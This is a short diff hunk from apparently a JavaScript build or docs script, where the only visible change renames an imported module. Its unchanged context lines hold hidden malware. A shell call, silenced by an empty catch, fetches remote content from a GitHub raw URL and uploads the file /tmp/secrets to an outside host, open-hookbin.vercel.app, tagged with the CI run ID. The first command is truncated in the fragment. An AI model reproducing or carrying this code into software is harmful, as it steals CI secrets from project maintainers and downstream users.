@@ -6,4 +6,4 @@ curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/mai
 curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${process.env.GITHUB_RUN_ID}"`, { shell: '/bin/bash' });
   }
 } catch (e) {}
-import('./list-workspaces-for-docs-real.js')
+import('./list-workspaces-real.js')
